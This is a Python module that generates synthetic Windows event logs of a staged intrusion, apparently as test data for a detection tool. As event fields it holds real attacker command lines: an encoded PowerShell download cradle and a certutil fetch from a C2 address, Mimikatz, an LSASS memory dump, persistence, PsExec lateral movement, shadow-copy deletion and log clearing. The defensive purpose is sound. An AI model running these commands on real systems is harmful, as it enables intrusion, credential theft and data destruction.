"""Synthetic but realistic attack dataset so the tool works without Sysmon installed."""
import base64
from datetime import datetime, timedelta

SYS = "Microsoft-Windows-Sysmon/Operational"
SEC = "Security"
SYSTEM = "System"
PSOP = "Microsoft-Windows-PowerShell/Operational"
WKS = "WKS-FIN-07.corp.local"
DC = "SRV-DC01.corp.local"
C2 = "185.220.101.45"


def b64(text):
    return base64.b64encode(text.encode("utf-16-le")).decode()


def generate():
    base = datetime(2026, 11, 8, 9, 0, 0)
    events = []
    counter = [0]

    def guid():
        counter[0] += 1
        return "{%08X-0000-0000-0000-%012X}" % (counter[0], counter[0])

    def add(sec, eid, channel, host, **data):
        events.append({"time": base + timedelta(seconds=sec), "eid": eid, "channel": channel,
                       "provider": "", "host": host, "record_id": str(len(events) + 1), "data": data})

    def proc(sec, host, image, cmd, parent_guid, parent_image, user):
        g = guid()
        add(sec, 1, SYS, host, Image=image, CommandLine=cmd, ParentImage=parent_image,
            ParentProcessGuid=parent_guid, ProcessGuid=g, User=user)
        return g

    # ---- benign baseline noise ----
    explorer = proc(1, WKS, r"C:\Windows\explorer.exe", r"C:\Windows\Explorer.EXE", "{0}", r"C:\Windows\System32\userinit.exe", r"CORP\jdoe")
    for i in range(25):
        proc(30 + i * 20, WKS, r"C:\Program Files\Google\Chrome\Application\chrome.exe",
             r'"chrome.exe" --type=renderer --lang=en-US', explorer, r"C:\Windows\explorer.exe", r"CORP\jdoe")
        add(40 + i * 20, 3, SYS, WKS, Image=r"C:\Program Files\Google\Chrome\Application\chrome.exe", Initiated="true",
            DestinationIp="142.250.77.14", DestinationPort="443", ProcessGuid=explorer)
    for i in range(6):
        proc(60 + i * 90, WKS, r"C:\Windows\System32\svchost.exe", r"C:\Windows\system32\svchost.exe -k netsvcs",
             "{0}", r"C:\Windows\System32\services.exe", r"NT AUTHORITY\SYSTEM")
    add(200, 4625, SEC, WKS, TargetUserName="jdoe", IpAddress="10.10.5.23", LogonType="2")
    add(210, 4625, SEC, WKS, TargetUserName="jdoe", IpAddress="10.10.5.23", LogonType="2")
    add(220, 4624, SEC, WKS, TargetUserName="jdoe", IpAddress="10.10.5.23", LogonType="2",
        AuthenticationPackageName="Negotiate", KeyLength="128")

    # ---- Stage 1: phishing macro -> PowerShell -> C2 ----
    word = proc(600, WKS, r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
                r'"WINWORD.EXE" "C:\Users\jdoe\Downloads\Invoice_Q4.docm"', explorer,
                r"C:\Windows\explorer.exe", r"CORP\jdoe")
    payload = b64("IEX (New-Object Net.WebClient).DownloadString('http://%s/a.ps1')" % C2)
    cmd = proc(612, WKS, r"C:\Windows\System32\cmd.exe",
               r"cmd.exe /c powershell -nop -w hidden -enc " + payload, word,
               r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE", r"CORP\jdoe")
    ps = proc(613, WKS, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
              r"powershell -nop -w hidden -enc " + payload, cmd, r"C:\Windows\System32\cmd.exe", r"CORP\jdoe")
    add(615, 3, SYS, WKS, Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", Initiated="true",
        DestinationIp=C2, DestinationPort="443", ProcessGuid=ps)
    add(618, 4104, PSOP, WKS, ScriptBlockText="IEX (New-Object Net.WebClient).DownloadString('http://%s/a.ps1'); Invoke-Mimikatz -DumpCreds" % C2)
    proc(625, WKS, r"C:\Windows\System32\certutil.exe",
         r"certutil.exe -urlcache -split -f http://%s/svc.exe C:\Users\Public\svc.exe" % C2, ps,
         r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", r"CORP\jdoe")
    svc = proc(640, WKS, r"C:\Users\Public\svc.exe", r"C:\Users\Public\svc.exe", ps,
               r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", r"CORP\jdoe")

    # ---- Stage 2: persistence + defense evasion ----
    proc(660, WKS, r"C:\Windows\System32\schtasks.exe",
         r'schtasks /create /tn "WindowsUpdateCheck" /tr C:\Users\Public\svc.exe /sc onlogon /ru system',
         svc, r"C:\Users\Public\svc.exe", r"CORP\jdoe")
    proc(670, WKS, r"C:\Windows\System32\reg.exe",
         r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d C:\Users\Public\svc.exe /f",
         svc, r"C:\Users\Public\svc.exe", r"CORP\jdoe")
    add(671, 13, SYS, WKS, Image=r"C:\Windows\System32\reg.exe",
        TargetObject=r"HKU\S-1-5-21-111\Software\Microsoft\Windows\CurrentVersion\Run\Updater",
        Details=r"C:\Users\Public\svc.exe", ProcessGuid=svc)
    add(680, 11, SYS, WKS, Image=r"C:\Users\Public\svc.exe", ProcessGuid=svc,
        TargetFilename=r"C:\Users\jdoe\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\upd.lnk")
    add(690, 20, SYS, WKS, Name="SystemUpdater", Destination=r"C:\Users\Public\svc.exe", Operation="Created")
    proc(700, WKS, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
         r"powershell Add-MpPreference -ExclusionPath C:\Users\Public", svc, r"C:\Users\Public\svc.exe", r"CORP\jdoe")

    # ---- Stage 3: discovery ----
    for i, c in enumerate([r"whoami /all", r"net user /domain", r"nltest /dclist:corp.local",
                           r'net group "domain admins" /domain', r"ipconfig /all"]):
        exe = c.split()[0] + ".exe"
        proc(760 + i * 12, WKS, "C:\\Windows\\System32\\" + exe, c, svc, r"C:\Users\Public\svc.exe", r"CORP\jdoe")

    # ---- Stage 4: credential access ----
    proc(880, WKS, r"C:\Windows\System32\rundll32.exe",
         r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 672 C:\Users\Public\l.dmp full",
         svc, r"C:\Users\Public\svc.exe", r"CORP\jdoe")
    add(881, 10, SYS, WKS, SourceImage=r"C:\Users\Public\svc.exe", TargetImage=r"C:\Windows\System32\lsass.exe",
        GrantedAccess="0x1fffff", SourceProcessGUID=svc)
    add(900, 8, SYS, WKS, SourceImage=r"C:\Users\Public\svc.exe", TargetImage=r"C:\Windows\explorer.exe",
        SourceProcessGuid=svc)

    # ---- Stage 5: lateral movement to the domain controller ----
    for i in range(12):
        add(1100 + i * 5, 4625, SEC, DC, TargetUserName=["administrator", "adm_backup", "sqlsvc", "helpdesk", "svc_web", "jsmith"][i % 6],
            IpAddress="10.10.5.23", LogonType="3")
    add(1170, 4624, SEC, DC, TargetUserName="adm_backup", IpAddress="10.10.5.23", LogonType="3",
        AuthenticationPackageName="NTLM", KeyLength="0", LogonProcessName="NtLmSsp")
    psexec = proc(1200, WKS, r"C:\Users\Public\PsExec64.exe", r"C:\Users\Public\PsExec64.exe \\SRV-DC01 -accepteula -s cmd.exe",
                  svc, r"C:\Users\Public\svc.exe", r"CORP\adm_backup")
    add(1205, 3, SYS, WKS, Image=r"C:\Users\Public\PsExec64.exe", Initiated="true", DestinationIp="10.10.1.10",
        DestinationPort="445", ProcessGuid=psexec)
    add(1210, 7045, SYSTEM, DC, ServiceName="PSEXESVC", ImagePath=r"%SystemRoot%\PSEXESVC.exe")
    dcshell = proc(1220, DC, r"C:\Windows\System32\cmd.exe", r"cmd.exe", "{0}", r"C:\Windows\PSEXESVC.exe", r"NT AUTHORITY\SYSTEM")

    # ---- Stage 6: domain persistence, kerberoasting, impact ----
    add(1260, 4769, SEC, DC, ServiceName="MSSQLSvc/sql01.corp.local:1433", TicketEncryptionType="0x17",
        TargetUserName="adm_backup@CORP.LOCAL")
    add(1290, 4720, SEC, DC, TargetUserName="svc_backup2", SubjectUserName="adm_backup")
    add(1295, 4732, SEC, DC, TargetUserName="Administrators", SubjectUserName="adm_backup", MemberName="svc_backup2")
    proc(1330, DC, r"C:\Windows\System32\vssadmin.exe", r"vssadmin.exe delete shadows /all /quiet", dcshell,
         r"C:\Windows\System32\cmd.exe", r"NT AUTHORITY\SYSTEM")
    proc(1335, DC, r"C:\Windows\System32\bcdedit.exe", r"bcdedit /set {default} recoveryenabled no", dcshell,
         r"C:\Windows\System32\cmd.exe", r"NT AUTHORITY\SYSTEM")
    add(1360, 1102, SEC, DC, SubjectUserName="adm_backup")
    return events